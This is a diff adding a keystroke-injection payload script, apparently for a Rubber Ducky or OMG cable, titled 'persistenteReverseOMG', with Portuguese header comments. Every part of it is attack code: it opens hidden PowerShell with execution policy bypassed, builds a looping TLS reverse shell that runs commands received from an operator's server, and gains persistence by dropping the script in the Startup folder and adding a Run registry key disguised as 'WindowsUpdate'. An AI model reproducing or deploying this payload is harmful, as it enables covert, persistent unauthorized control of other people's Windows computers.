@@ -1,0 +1,91 @@
+Título REM: persistenteReverseOMG
+Descrição REM: persistenteReverseOMG fornece shell reverso persistente remotamente/localmente.
+AUTOR REM: Mercylessghost
+Versão REM: 1.1
+Categoria REM: Acesso Remoto
+Destino REM: sistema operacional Windows
+
+REM NOTE: Replace IP address(172.19.42.156) and port number(443) with your server's IP address and Port Number.
+
+DELAY 2000
+REM Define your language below
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell -NoP -NonI -W Hidden -Exec Bypass
+ENTER
+DELAY 1000
+
+STRING $ErrorActionPreference = 'SilentlyContinue'
+ENTER
+DELAY 100
+
+STRING $address = '000.000.000.000'
+ENTER
+STRING $port = 443
+ENTER
+DELAY 100
+
+STRING $script = @"
+ENTER
+STRING while (\$true) {
+ENTER
+STRING try {
+ENTER
+STRING \$client = New-Object System.Net.Sockets.TcpClient(\$address, \$port);
+ENTER
+STRING \$stream = \$client.GetStream();
+ENTER
+STRING \$sslStream = New-Object System.Net.Security.SslStream(\$stream, \$false, ({\$true}));
+ENTER
+STRING \$sslStream.AuthenticateAsClient(\$address);
+ENTER
+STRING \$writer = New-Object System.IO.StreamWriter(\$sslStream);
+ENTER
+STRING \$reader = New-Object System.IO.StreamReader(\$sslStream);
+ENTER
+STRING \$writer.AutoFlush = \$true;
+ENTER
+STRING while (\$true) {
+ENTER
+STRING \$command = \$reader.ReadLine();
+ENTER
+STRING if (\$command -eq 'exit') { break; }
+ENTER
+STRING \$result = Invoke-Expression \$command 2>&1 | Out-String;
+ENTER
+STRING \$writer.WriteLine(\$result);
+ENTER
+STRING \$writer.Flush();
+ENTER
+STRING }
+ENTER
+STRING \$client.Close();
+ENTER
+STRING }
+ENTER
+STRING catch {
+ENTER
+STRING Start-Sleep -Seconds 5;
+ENTER
+STRING }
+ENTER
+STRING }
+ENTER
+STRING "@
+ENTER
+DELAY 100
+
+STRING $path = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\reverse.ps1"
+ENTER
+STRING Set-Content -Path $path -Value $script
+ENTER
+DELAY 100
+
+STRING Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -Value "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -File $path"
+ENTER
+DELAY 100
+
+STRING powershell.exe -NoP -NonI -W Hidden -Exec Bypass -File $path
+ENTER
+DELAY 100
